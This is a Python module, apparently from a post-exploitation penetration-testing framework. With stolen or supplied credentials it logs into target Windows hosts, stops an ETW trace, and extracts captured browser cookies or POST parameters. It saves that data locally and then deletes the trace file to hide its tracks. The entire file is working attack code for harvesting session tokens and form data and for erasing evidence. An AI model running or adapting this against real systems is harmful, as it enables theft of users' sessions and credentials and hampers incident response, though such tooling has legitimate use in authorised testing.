"""

Parses the results found for the ETW started on a machine,
downloads the results and stops the ETW.

All credit to pauldotcom-
     http://pauldotcom.com/2012/07/post-exploitation-recon-with-e.html


Module built by @harmj0y

"""

import settings

from lib import command_methods
from lib import helpers
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "ETW Data Download"
        self.description = "Download data results from ETW and clean everything up."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "flag"              :   ["cookies", "search for [cookies] or [post] parameters"]}


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        flag = self.required_options["flag"][0]

        for target in self.targets:

            # stop the ETW
            stopCMD = "logman stop Status32 -ets"
            command_methods.executeCommand(target, username, password, stopCMD, triggerMethod)

            # search for cookies or POST paramters
            if flag.lower() == "post":
                flag = "POST"
                moduleFile = "post_params.txt"
            else:
                flag = "cookie added"
                moduleFile = "cookies.txt"

            # check the ETW results for the specified flag, and delete the dump file
            parseCmd = "wevtutil qe C:\\Windows\\Temp\\status32.etl /lf:true /f:Text | find /i \""+flag+"\""
            
            # wait 20 seconds for everything to parse...if errors happen, increase this
            parseResult = command_methods.executeResult(target, username, password, parseCmd, triggerMethod, pause=20)

            # delete the trace file
            delCmd = "del C:\\Windows\\Temp\\status32.etl"
            command_methods.executeCommand(target, username, password, delCmd, triggerMethod)

            if parseResult == "":
                self.output += "[!] No ETW results for "+flag+" using creds '"+username+":"+password+"' on : " + target + "\n"
            else:
                # save the file off to the appropriate location
                saveFile = helpers.saveModuleFile(self, target, moduleFile, parseResult)
                self.output += "[*] ETW results for "+flag+" using creds '"+username+":"+password+"' on " + target + " stored at "+saveFile+"\n"
